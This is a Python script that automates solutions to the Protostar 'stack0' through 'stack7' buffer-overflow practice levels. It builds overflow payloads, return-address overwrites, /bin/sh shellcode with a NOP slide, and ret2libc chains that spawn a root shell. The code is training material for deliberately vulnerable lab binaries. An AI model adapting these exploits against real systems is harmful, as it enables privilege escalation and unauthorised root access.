from subprocess import Popen, PIPE
import protopwn as p
import struct
import os
import sys
import time
import signal

#--------------------------------+
# change the 'modified' variable |
#--------------------------------+
def stack0():
    name = "stack0"
    p.start(name)
    path = p.PATH + name
    
    payload = ("A" * 65)

    proc = Popen(path, stdin=PIPE, stdout=PIPE)

    out = proc.communicate(input=payload)

    if "modified" in out[0]:
        p.content(out[0])
        p.ok("solved !")
    else:
        p.err("failed")

#-------------------------------------+
# change the 'modified' var to 'dcba' |
#-------------------------------------+
def stack1():
    name = "stack1"
    p.start(name)
    path = p.PATH + name

    payload = "A" * 64
    payload += "dcba"

    proc = Popen([path, payload], stdin=PIPE, stdout=PIPE)

    out = proc.communicate()

    if "correctly" in out[0]:
        p.content(out[0])
        p.ok("solved !")
    else:
        p.err("failed")

#--------------------------------+
# change the 'modified' variable |
# to '0x0d0a0d0a' by using ENVAR |
#--------------------------------+
def stack2():
    name = "stack2"
    p.start(name)
    path = p.PATH + name

    payload = "A" * 64
    payload += struct.pack("I", 0x0d0a0d0a)

    env_var = "GREENIE"
    os.environ[env_var] = payload

    proc = Popen(path, stdin=PIPE, stdout=PIPE)

    out = proc.communicate()

    if "correctly" in out[0]:
        p.content(out[0])
        p.ok("solved !")
    else:
        p.err("failed")

#--------------------------+
# call the win() function  |
# by redirecting code flow |
#--------------------------+
def stack3():
    name = "stack3"
    p.start(name)
    path = p.PATH + name

    payload = "A" * 64
    payload += struct.pack("I", 0x08048424)

    proc = Popen(path, stdin=PIPE, stdout=PIPE)

    out = proc.communicate(input=payload)

    msg = out[0].partition('\n')[2]

    if "code" in msg:
        p.content(msg)
        p.ok("solved !")
    else:
        p.err("failed")

#--------------------------+
# call the win() function  |
# by redirecting code flow |
#--------------------------+
def stack4():
    name = "stack4"
    p.start(name)
    path = p.PATH + name

    payload = "A" * 76
    payload += struct.pack("I", 0x080483f4)
    payload += struct.pack("I", 0xb7ec60c0)

    proc = Popen(path, stdin=PIPE, stdout=PIPE)

    out = proc.communicate(input=payload)

    if "code" in out[0]:
        p.content(out[0])
        p.ok("solved !")
    else:
        p.err("failed")

#--------------------------+
# execute custom shellcode |
#--------------------------+
def stack5():
    name = "stack5"
    p.start(name)
    path = p.PATH + name

    shellcode = "\x31\xc0\x50\x68" \
                "\x2f\x2f\x73\x68" \
                "\x68\x2f\x62\x69" \
                "\x6e\x89\xe3\x50" \
                "\x53\x89\xe1\xb0" \
                "\x0b\xcd\x80"

    padding = "A" * 76
    eip = struct.pack("I", 0xbffff6bc)
    nopslide = "\x90" * 100

    payload = padding + eip + nopslide + shellcode

    cmdstr = "(echo '" + payload + "'; cat) | ./" + name
    exec_count = 1

    while True:
        p.info("sending payload")
        proc = Popen([cmdstr], shell=True, stdin=PIPE, stdout=PIPE)

        p.info("calling 'whoami'")
        out = proc.communicate(input="whoami")

        if "root" in out[0]:
            p.ok('triggered buffer overflow after [ %s ] executions' % exec_count)
            p.content("root")
            p.ok("solved !")
            break

        exec_count += 1
        p.warn("failed to overflow, trying again ...")
        time.sleep(1)

#-------------+
# pop a shell |
#-------------+
def stack6():
    name = "stack6"
    p.start(name)
    path = p.PATH + name

    padding = "A" * 80

    system = struct.pack("I", 0xb7ecffb0)
    exit = struct.pack("I", 0xb7ec60c0)
    binsh = struct.pack("I", 0xb7fb63bf)

    payload = padding + system + exit + binsh

    cmdstr = "(echo '" + payload + "'; cat) | ./" + name
    exec_count = 1

    while True:
        p.info("sending payload")
        proc = Popen([cmdstr], shell=True, stdin=PIPE, stdout=PIPE)

        p.info("calling 'whoami'")
        out = proc.communicate(input="whoami")

        if "root" in out[0]:
            p.ok('triggered ret2libc after [ %s ] executions' % exec_count)
            p.content("root")
            p.ok("solved !")
            break

        exec_count += 1
        p.warn("failed to trigger, trying again ...")
        time.sleep(1)

#-------------+
# pop a shell |
#-------------+
def stack7():
    name = "stack7"
    p.start(name)
    path = p.PATH + name

    padding = "A" * 80

    ret = struct.pack("I", 0x08048544)

    system = struct.pack("I", 0xb7ecffb0)
    binsh = struct.pack("I", 0xb7fb63bf)
    exit = struct.pack("I", 0xb7ec60c0)
    
    payload = padding + ret + system + exit + binsh

    cmdstr = "(echo '" + payload + "'; cat) | ./" + name
    exec_count = 1

    while True:
        p.info("sending payload")
        proc = Popen([cmdstr], shell=True, stdin=PIPE, stdout=PIPE)

        p.info("calling 'whoami'")
        out = proc.communicate(input="whoami")

        if "root" in out[0]:
            p.ok('triggered ret2libc after [ %s ] executions' % exec_count)
            p.content("root")
            p.ok("solved !")
            break

        exec_count += 1
        p.warn("failed to trigger, trying again ...")
        time.sleep(1)
    
def stack_solve():
    stack0()
    stack1()
    stack2()
    stack3()
    stack4()
    stack5()
    stack6()
    stack7()
